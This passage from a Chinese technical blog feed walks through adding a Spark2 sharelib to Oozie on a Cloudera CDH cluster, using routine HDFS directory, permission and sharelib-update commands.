shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u oozie hdfs dfs -mkdir /user/oozie/share/lib/lib_20190521144826/spark2</span><br></pre></td></tr></table></figure><h3 id="向文件夹中添加Spark2需要的jar包"><a href="#向文件夹中添加Spark2需要的jar包" class="headerlink" title="向文件夹中添加Spark2需要的jar包"></a>向文件夹中添加Spark2需要的jar包</h3><p><code>/opt/cloudera/parcels/SPARK2/lib/spark2/jars</code>文件夹下的所有内容和</p><p><code>/opt/cloudera/parcels/CDH/lib/oozie/oozie-sharelib-yarn/lib/spark</code>下面的<code>oozie-sharelib-spark*.jar</code></p><p>在公司当前环境下，最终能凑齐的一共有293个jar文件，这边我下载下来打个包存在TIM里面，下次使用方便一些。</p><h3 id="修改目录的所有者和权限"><a href="#修改目录的所有者和权限" class="headerlink" title="修改目录的所有者和权限"></a>修改目录的所有者和权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u hdfs hadoop fs –chown -R oozie:oozie /user/oozie/share/lib/lib_20170921070424/spark2</span><br><span class="line">sudo -u hdfs hadoop fs –chmod -R 775 /user/oozie/share/lib/lib_20170921070424/spark2</span><br></pre></td></tr></table></figure><h3 id="更新并且确认"><a href="#更新并且确认" class="headerlink" title="更新并且确认"></a>更新并且确认</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oozie admin -oozie http://master126:11000/oozie -sharelibupdate</span><br><span class="line">oozie admin -oozie http://master126:11000/oozie -shareliblist</span><br></pre></td></tr></table></figure><h3 id="用样例验证"><a href="#用样例验证" class="headerlink" title="用样例验证"></a>用样例验证</h3><p>测试的时候别的没什么</p><p>properties要注意修改为</p><table><thead><tr><th>–</th><th>–</th></tr></thead><tbody><tr><td>oozie.action.sharelib.for.spark</td><td>spark2</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;HDFS上的数据在添加节点失败后，出现了很多块的损坏，得重新配置一遍&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="CDH" scheme="http://yoursite.com/categories/Hadoop/CDH/"/>
    
    
      <category term="HUE" scheme="http://yoursite.com/tags/HUE/"/>
    
  </entry>
  
</feed>
